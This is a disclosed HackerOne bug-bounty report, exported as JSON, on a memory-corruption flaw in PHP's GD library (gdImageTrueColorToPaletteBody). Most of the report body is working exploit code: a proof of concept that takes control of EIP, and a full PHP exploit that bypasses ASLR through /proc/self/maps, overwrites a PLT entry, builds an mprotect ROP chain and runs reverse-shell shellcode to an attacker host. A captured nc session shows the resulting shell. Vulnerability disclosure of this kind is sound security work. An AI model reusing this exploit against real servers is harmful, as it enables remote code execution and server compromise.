{"id":153776,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTM3NzY=","url":"https://hackerone.com/reports/153776","title":"gdImageTrueColorToPaletteBody allows arbitrary write/read access","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-07-25T18:46:54.446Z","submitted_at":"2016-07-25T18:46:54.446Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fms","url":"/fms","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":54349,"url":"https://hackerone.com/ibb","handle":"ibb","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVIDF5ZMX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134550Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDQQQUuKj8T5pdoqR2Krp3zajoi1gg54vXvD2Ne1FwhmAIhAKKfb3UfAQbrUu4HHC%2B4UyMY7m5fBTHvtLlTV0hUevF7KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igy%2F64SgTlh6KUEnD5Uq1wMsL4Z6ljP60c3R7lO1zjypi9biR2g5iQoP%2FT3s6lOKdbpGuE3RHjMeja9YKKN7goc11u6bYdonocyi6RU8RN2An2aRnhfVo3l%2FZlMwpffUbu5JHc7OKmtZqUXTysPRszIl1CCSQ50yZBwtNWg%2Fxavv6bNKeHjCjYNwQxGBqC%2ByBW24czUMzGzaD5uFMoYGAMoWIxFJ6iHFG8UfXfoB1shKsZ3jkdkCp2MI12RtkuUec%2F0QW%2BSUqdLWUg2p3%2B1H%2FJaoFmNN5Utibk4elkj5kRmoejx7EnpbtxcHN1J6Ccb1mMlapHFqvmkcjE8fLu3vLMoRZX0qMhHcbtwHM4mmdbMGDcLaK4ZzuGUfKK3tlGfzyb%2BJEOYnCFd1OBdp9DB9bhiSMWyc1JifbNweT%2F1X1i3QMSQ%2BviuXf%2Bxvep9dRJ8nErGx9JdRp3yS8jCqdzkSh9FhreaRloo4jHkFXz72rd1zbbphih0VnX1T1kREihWx9RKRGpfOf2ct6w59fDThEMiXM7%2B1ZWMP1qPO2XDz8hAqeQqURPDe5AmiGn%2FZKFThe%2F8xzj0%2B5M2W36t3rKudZmsfzk9t0V0gZgIgIqXzHYE871rDImxmRy6q2HeWGIt10F1JC%2Fc9vpEwvO6QiwY6pAFAIHM092pG3M%2B23%2BPi00SqMMlTN%2FebpZH7d1Rq7%2BpDNNT62MHysMiTIJwmN0mj3cgRIiDLQKqFPlp97hcSQcDzJF%2F5WJ%2FSpWbDFtqVjRTP9eZ3KoMBEOEbvq2IGUFF14lCJNIXEj03clafpnnHjjr5akYILvb51xnKlHai4iTUO00TgVrv5%2FXDjYcFV06nU8YCB3mUWnDHCpTI6c%2BltGO9Yt9pxQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7bfaaa8d263c6980662f4ebac691fac3924b1dc015a304c55082408123492aef","medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVIDF5ZMX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134550Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDQQQUuKj8T5pdoqR2Krp3zajoi1gg54vXvD2Ne1FwhmAIhAKKfb3UfAQbrUu4HHC%2B4UyMY7m5fBTHvtLlTV0hUevF7KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igy%2F64SgTlh6KUEnD5Uq1wMsL4Z6ljP60c3R7lO1zjypi9biR2g5iQoP%2FT3s6lOKdbpGuE3RHjMeja9YKKN7goc11u6bYdonocyi6RU8RN2An2aRnhfVo3l%2FZlMwpffUbu5JHc7OKmtZqUXTysPRszIl1CCSQ50yZBwtNWg%2Fxavv6bNKeHjCjYNwQxGBqC%2ByBW24czUMzGzaD5uFMoYGAMoWIxFJ6iHFG8UfXfoB1shKsZ3jkdkCp2MI12RtkuUec%2F0QW%2BSUqdLWUg2p3%2B1H%2FJaoFmNN5Utibk4elkj5kRmoejx7EnpbtxcHN1J6Ccb1mMlapHFqvmkcjE8fLu3vLMoRZX0qMhHcbtwHM4mmdbMGDcLaK4ZzuGUfKK3tlGfzyb%2BJEOYnCFd1OBdp9DB9bhiSMWyc1JifbNweT%2F1X1i3QMSQ%2BviuXf%2Bxvep9dRJ8nErGx9JdRp3yS8jCqdzkSh9FhreaRloo4jHkFXz72rd1zbbphih0VnX1T1kREihWx9RKRGpfOf2ct6w59fDThEMiXM7%2B1ZWMP1qPO2XDz8hAqeQqURPDe5AmiGn%2FZKFThe%2F8xzj0%2B5M2W36t3rKudZmsfzk9t0V0gZgIgIqXzHYE871rDImxmRy6q2HeWGIt10F1JC%2Fc9vpEwvO6QiwY6pAFAIHM092pG3M%2B23%2BPi00SqMMlTN%2FebpZH7d1Rq7%2BpDNNT62MHysMiTIJwmN0mj3cgRIiDLQKqFPlp97hcSQcDzJF%2F5WJ%2FSpWbDFtqVjRTP9eZ3KoMBEOEbvq2IGUFF14lCJNIXEj03clafpnnHjjr5akYILvb51xnKlHai4iTUO00TgVrv5%2FXDjYcFV06nU8YCB3mUWnDHCpTI6c%2BltGO9Yt9pxQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5d67f4b94b90a570af36452bbe4fe51f8a99be78131f46f5f6ffe74aee16338f"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Internet Bug Bounty","twitter_handle":"","website":"https://www.hackerone.com/internet-bug-bounty","about":"The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-31T06:16:54.634Z","bug_reporter_agreed_on_going_public_at":"2019-10-31T06:16:54.588Z","team_member_agreed_on_going_public_at":"2019-10-13T09:33:33.131Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Upstream bug report\n================\n2016-06-29 04:03 UTC\nhttps://bugs.php.net/bug.php?id=72512\n\n\nPatch\n=====\n2016-07-19 07:47 UTC\nhttp://git.php.net/?p=php-src.git;a=commit;h=928aecc002e906b309b28f0062f03d4e5eda3e45\nFixed for PHP 5.5 (security only mode), PHP 5.6, PHP 7.0\nhttp://php.net/ChangeLog-5.php#5.5.38\nhttp://php.net/ChangeLog-5.php#5.6.24\nhttp://php.net/ChangeLog-7.php#7.0.9\n\nDescription\n=========\ngdImageTrueColorToPaletteBody doesn't check for negative transparent colors while converting the image. This leads to arbitrary null write and information leak.\n\nDetails\n=======\nhttps://github.com/php/php-src/blob/master/ext/gd/libgd/gd_topal.c#L2000\n\n```\n...\nif (oim-\u003etransparent \u003e= 0)\n{\n nim-\u003etransparent = nim-\u003ecolorsTotal;\n nim-\u003ecolorsTotal++;\n}\n...\n```\nnim-\u003etransparent will only be updated with a valid index if oim-\u003etransparent is bigger than 0, however it can be set to be a negative color using gdImageColorTransparent\n\nhttps://github.com/php/php-src/blob/master/ext/gd/libgd/gd.c#L598\n```\nvoid gdImageColorTransparent (gdImagePtr im, int color)\n{\n       if (!im-\u003etrueColor) {\n               if (im-\u003etransparent != -1) {\n                       im-\u003ealpha[im-\u003etransparent] = gdAlphaOpaque;\n               }\n               if (color \u003e 1 \u0026\u0026 color \u003c im\u003ecolorsTotal \u0026\u0026 color \u003c gdMaxColors) {\n                       im-\u003ealpha[color] = gdAlphaTransparent;\n               } else {\n                       return;\n               }\n       }\n       im-\u003etransparent = color;\n}\n```\nAs you can see here, there's no check for color on truecolor images.  \n\nArbitrary Null Write\n----------------------------\nSetting im-\u003etransparent to a negative value, and then converting it to palette will allow to write an arbitrary null using gdImageColorTransparent again (above function):\n```\n       im-\u003ealpha[im-\u003etransparent] = gdAlphaOpaque;\n```\n\nLeak arbitrary memory using imagescale:\n---------------------------------------------------------\nhttps://github.com/php/php-src/blob/master/ext/gd/libgd/gd_interpolation.c#L1247 \n```\nstatic gdImagePtr gdImageScaleBilinearPalette(gdImagePtr im, const unsigned int new_width, const unsigned int new_height)\n{\n...\n        new_img-\u003etransparent = gdTrueColorAlpha(im-\u003ered[transparent], im-\u003egreen[transparent], im-\u003eblue[transparent], im-\u003ealpha[transparent]);   # transparent out of bounds\n...\n}\n```\nnew_img-\u003etransparent value is calculated adding the values using transparent as an index.\n\nEIP control\n--------------\nWe are able to control EIP register by abusing these two issues:\n```\n\u003c?php\nini_set('memory_limit', -1);\n\n/*\nobjdump -d /home/user/php/php-70/sapi/cli/php|grep -A 2 strlen@plt\n\n08065ce0 \u003cstrlen@plt\u003e:\n 8065ce0:       ff 25 c0 72 b4 08       jmp    *0x8b472c0\n 8065ce6:       68 68 05 00 00          push   $0x568\n\n*/\n$plt_strlen = 0x8b472c0;\n\n$img = imagecreatetruecolor($plt_strlen + 0x10, 1);  // Image with enough width to reach plt_strlen address\nimagecolortransparent($img, -24060);    // Constant offset to reach first element from array img-\u003epixels\nimagetruecolortopalette($img, TRUE, 3);\nimagecolortransparent($img, 0xff);     // Set to null first element from img-\u003epixels  \n\n// Allocate palette colors\nfor ($i = 0; $i \u003c 256; $i++) imagecolorallocatealpha($img, $i, $i, $i, $i);\n\n// Overwrite strlen plt address with 0x44434241\nimagesetpixel($img, $plt_strlen, 0, 0x41);\nimagesetpixel($img, $plt_strlen+1, 0, 0x42);\nimagesetpixel($img, $plt_strlen+2, 0, 0x43);\nimagesetpixel($img, $plt_strlen+3, 0, 0x44);\n```\n\nGDB output:\n```\ngdb -q --args /home/user/php/php-70/sapi/cli/php poc3.php\nNo symbol table is loaded.  Use the \"file\" command.\nBreakpoint 1 (__asan_report_error) pending.\nReading symbols from /home/user/php/php-70/sapi/cli/php...done.\ngdb-peda$ r\nStarting program: /home/user/php/php-70/sapi/cli/php poc3.php\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0x8b91660 (\"text/html\")\nEBX: 0x8b47000 --\u003e 0x8b46db8 --\u003e 0x1 \nECX: 0xee50aaae \nEDX: 0xffffbe98 --\u003e 0x8b47000 --\u003e 0x8b46db8 --\u003e 0x1 \nESI: 0x8b47000 --\u003e 0x8b46db8 --\u003e 0x1 \nEDI: 0x8b7a518 --\u003e 0x0 \nEBP: 0xffffba38 --\u003e 0xffffbb98 --\u003e 0xffffbba8 --\u003e 0xffffbbb8 --\u003e 0xffffbbd8 --\u003e 0xffffc2e8 (--\u003e ...)\nESP: 0xffffb9fc --\u003e 0x83e6d0e (\u003cget_default_content_type+70\u003e:\tadd    esp,0x10)\nEIP: 0x44434241 ('ABCD')\nEFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x44434241\n[------------------------------------stack-------------------------------------]\n0000| 0xffffb9fc --\u003e 0x83e6d0e (\u003cget_default_content_type+70\u003e:\tadd    esp,0x10)\n0004| 0xffffba00 --\u003e 0x8b91660 (\"text/html\")\n0008| 0xffffba04 --\u003e 0x0 \n0012| 0xffffba08 --\u003e 0x8a62758 (\"/home/user/php/php-70/Zend/zend_hash.c\")\n0016| 0xffffba0c --\u003e 0x83e6cd4 (\u003cget_default_content_type+12\u003e:\tadd    ebx,0x76032c)\n0020| 0xffffba10 --\u003e 0x0 \n0024| 0xffffba14 --\u003e 0x8474df1 (\u003czend_hash_iterators_remove+8\u003e:\tadd    eax,0x6d220f)\n0028| 0xffffba18 --\u003e 0x8b91660 (\"text/html\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x44434241 in ?? ()\ngdb-peda$ \n```\nCode execution\n--------------\n```\n\u003c?php\n// Tested on Debian x86 Jessie update + NGINX + PHP-FPM\n\n/*\n objdump -d /usr/sbin/php5-fpm |grep -A 2 write|more\n\n08096b50 \u003cwrite@plt\u003e:\n 8096b50:       ff 25 a4 93 96 08       jmp    *0x89693a4\n 8096b56:       68 30 07 00 00          push   $0x730\n\n*/\n\n$plt_write = 0x89693a4;\n\nfunction get_maps() {\n        $fh = fopen(\"/proc/self/maps\", \"r\");\n        $maps = fread($fh, 31337);\n        fclose($fh);\n        return explode(\"\\n\", $maps);\n}\n\n// Fill heap with nulled basic gdImage structures\n$imgs = array();\nfor ($i = 0; $i \u003c 10; $i++) $imgs[$i] = imagecreatetruecolor(10, 10);\n\n// Image with enough width to reach plt_write address\n$evilimg = imagecreatetruecolor($plt_write + 10, 1);\n\n// Set brush at last gdImage to leak evilimg address\nimagesetbrush ($imgs[9], $evilimg);\n\n// -516 : offset to reach **evilimg-\u003epixels pointer\nimagecolortransparent($evilimg, -516);\nimagetruecolortopalette($evilimg, TRUE, 3);\n\n// Data leak from **evilimg-\u003epixels address trough imagescale bug \n$imgtmp = imagescale($evilimg, 10, 10);\n$x1 = imagecolortransparent($imgtmp);\necho \"[+] pointer to colors @ 0x\".dechex($x1).\"\\n\";\n\n\n// Restore truecolor evilimg\nimagepalettetotruecolor($evilimg);\n\n// -1443 offset to reach brush pointer from img[9] element\nimagecolortransparent($evilimg, -1443);\n\n// Data leak from img[9]-\u003ebrush pointer = evilimg address\nimagetruecolortopalette($evilimg, TRUE, 3);\n$imgtmp2 = imagescale($evilimg, 10, 10);\n$x2 = imagecolortransparent($imgtmp2);\n\necho \"[+] pointer to image @ 0x\".dechex($x2).\"\\n\";\n\n// Relative offset to reach first element from **evilimg-\u003epixels (row 1 from image)\n$off = -1 * ((($x2 - $x1) / 4) + 1550);\necho \"[+] offset @ \" . $off .\"\\n\";\n\n// Restore truecolor evilimg\nimagepalettetotruecolor($evilimg);\n\n// Set to null first element from evilimg-\u003epixels\nimagecolortransparent($evilimg, $off);\nimagetruecolortopalette($evilimg, TRUE, 256);\nimagecolortransparent($evilimg, 0xff);\n\n// Bypass ASLR\n$libc_base = 0;\nforeach (get_maps() as $record)\n        if (strstr($record, \"libc-\") \u0026\u0026 strstr($record, \"r-xp\")) {\n               $libc_base = hexdec(explode('-', $record)[0]);\n                break;\n        }\n\nif ($libc_base == 0)\n        die(\"[-] can't find libc base, you need an information leak :[\");\n\necho \"[+] libc base @ 0x\".dechex($libc_base).\"\\n\";\n\n/*\nobjdump -T /lib/i386-linux-gnu/libc.so.6|grep mprotect\n000d4230  w   DF .text  00000037  GLIBC_2.0   mprotect\n*/\n\n$mprotect_offset = 0xd4230;\n$mprotect_addr = $libc_base + $mprotect_offset;\n\necho \"[+] mprotect @ 0x\".dechex($mprotect_addr).\"\\n\";\n\n\n/* gadgets\npgp5-fpm\n0x086ea6d1 : pop ebx ; pop ebx ; aas ; pop ebx ; ret\n0x080c5b76 : mov eax, ecx ; ret\n0x086d1cf0 : xchg eax, esi ; ret\n0x080efd28 : call esi\n\nlibc.so\n0x00102ec1 : push ecx ; add al, 0x8b ; pop ebp ; cld ; leave ; ret\n\n*/\n$pivot_offset = 0x00102ec1;\n$pivot =  $libc_base + $pivot_offset;\n$pop3 = 0x086ea6d1;\n\n// Overwrite write@plt entry to pivot address\nfor ($i = 0; $i \u003c 256; $i++) imagecolorallocatealpha($evilimg, $i, $i, $i, $i);\n$pivot_str = pack('I', $pivot);\nfor ($i = 0; $i \u003c strlen($pivot_str); $i++) {\n        imagesetpixel($evilimg, $plt_write + $i, 0, ord($pivot_str[$i]));\n}\n\n\n// Allocate shellcode\n$pre = get_maps();\n$buffer = str_repeat(\"\\x41\", 0xff0000);\n$post = get_maps();\n$tmp = array_diff($post, $pre);\nif (count($tmp) != 1)\n        die('[-] you need infoleak :[');\n$tmp = explode('-',array_values($tmp)[0])[0];\n$align = 0xff;\n$addr = hexdec($tmp) + 0x18; /* align to string */\n\necho \"[+] buffer string @ 0x\".dechex($addr).\"\\n\";\n\n// msfvenom -p linux/x86/shell_reverse_tcp -f python LHOST=10.0.3.1 LPORT=31337\n$shellcode = \"\";\n$shellcode .= \"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\";\n$shellcode .= \"\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x0a\";\n$shellcode .= \"\\x00\\x03\\x01\\x68\\x02\\x00\\x7a\\x69\\x89\\xe1\\xb0\\x66\\x50\";\n$shellcode .= \"\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x2f\\x2f\\x73\";\n$shellcode .= \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\";\n$shellcode .= \"\\x0b\\xcd\\x80\";\n\nfor ($i = 0; $i \u003c strlen($shellcode); $i++) $buffer[$i] = $shellcode[$i];\n\n\necho \"[+] building ropchain\\n\";\n\n// int mprotect(void *addr, size_t len, int prot);\n\n$rop_chain =\n\t\"AAAA\" .\n        pack('I', $mprotect_addr) /* mprotect */ .\n        pack('I', $pop3) /* pop pop pop ret */ .\n        pack('I', $addr - 0x18) /* mprotect addr  */ .\n        pack('I', 0x1000) /* mprotect len */ .\n        pack('I', 0x7) /* mprotect prot */ .\n        pack('I', $addr) /* jump to shellcode */ ;\n\n\n$temp = tmpfile();\n// Call to ropchain\nfwrite($temp, $rop_chain);\nfclose ($temp);\n```\n\nAttacker session\n```\nCall to PHP exploit:\n$ lynx http://10.0.3.246/gd4.php\n...\n$ nc -vlp 31337\nListening on [0.0.0.0] (family 0, port 31337)\nConnection from [10.0.3.246] port 31337 [tcp/*] accepted (family 2, sport 44816)\nid -a\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n```\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:33:33.206Z","allow_singular_disclosure_after":-60408737.53089665,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":{"databaseId":84120,"asset_type":"OTHER","asset_identifier":"PHP","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1098638,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-07-31T21:29:02.238Z","updated_at":"2016-07-31T21:29:02.238Z","actor":{"url":"/ibb","ibb":false,"profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVIDF5ZMX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134550Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDQQQUuKj8T5pdoqR2Krp3zajoi1gg54vXvD2Ne1FwhmAIhAKKfb3UfAQbrUu4HHC%2B4UyMY7m5fBTHvtLlTV0hUevF7KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igy%2F64SgTlh6KUEnD5Uq1wMsL4Z6ljP60c3R7lO1zjypi9biR2g5iQoP%2FT3s6lOKdbpGuE3RHjMeja9YKKN7goc11u6bYdonocyi6RU8RN2An2aRnhfVo3l%2FZlMwpffUbu5JHc7OKmtZqUXTysPRszIl1CCSQ50yZBwtNWg%2Fxavv6bNKeHjCjYNwQxGBqC%2ByBW24czUMzGzaD5uFMoYGAMoWIxFJ6iHFG8UfXfoB1shKsZ3jkdkCp2MI12RtkuUec%2F0QW%2BSUqdLWUg2p3%2B1H%2FJaoFmNN5Utibk4elkj5kRmoejx7EnpbtxcHN1J6Ccb1mMlapHFqvmkcjE8fLu3vLMoRZX0qMhHcbtwHM4mmdbMGDcLaK4ZzuGUfKK3tlGfzyb%2BJEOYnCFd1OBdp9DB9bhiSMWyc1JifbNweT%2F1X1i3QMSQ%2BviuXf%2Bxvep9dRJ8nErGx9JdRp3yS8jCqdzkSh9FhreaRloo4jHkFXz72rd1zbbphih0VnX1T1kREihWx9RKRGpfOf2ct6w59fDThEMiXM7%2B1ZWMP1qPO2XDz8hAqeQqURPDe5AmiGn%2FZKFThe%2F8xzj0%2B5M2W36t3rKudZmsfzk9t0V0gZgIgIqXzHYE871rDImxmRy6q2HeWGIt10F1JC%2Fc9vpEwvO6QiwY6pAFAIHM092pG3M%2B23%2BPi00SqMMlTN%2FebpZH7d1Rq7%2BpDNNT62MHysMiTIJwmN0mj3cgRIiDLQKqFPlp97hcSQcDzJF%2F5WJ%2FSpWbDFtqVjRTP9eZ3KoMBEOEbvq2IGUFF14lCJNIXEj03clafpnnHjjr5akYILvb51xnKlHai4iTUO00TgVrv5%2FXDjYcFV06nU8YCB3mUWnDHCpTI6c%2BltGO9Yt9pxQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5d67f4b94b90a570af36452bbe4fe51f8a99be78131f46f5f6ffe74aee16338f"},"profile":{"name":"Internet Bug Bounty"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb","collaborator":{"username":"fms","url":"/fms"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1098639,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2016-07-31T21:29:08.507Z","updated_at":"2016-07-31T21:29:08.507Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"fms","url":"/fms"},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6026307,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-10-13T09:33:33.147Z","updated_at":"2019-10-13T09:33:33.147Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6179122,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-10-31T06:16:54.605Z","updated_at":"2019-10-31T06:16:54.605Z","actor":{"username":"fms","cleared":false,"url":"/fms","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6179123,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-10-31T06:16:54.648Z","updated_at":"2019-10-31T06:16:54.648Z","actor":{"username":"fms","cleared":false,"url":"/fms","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}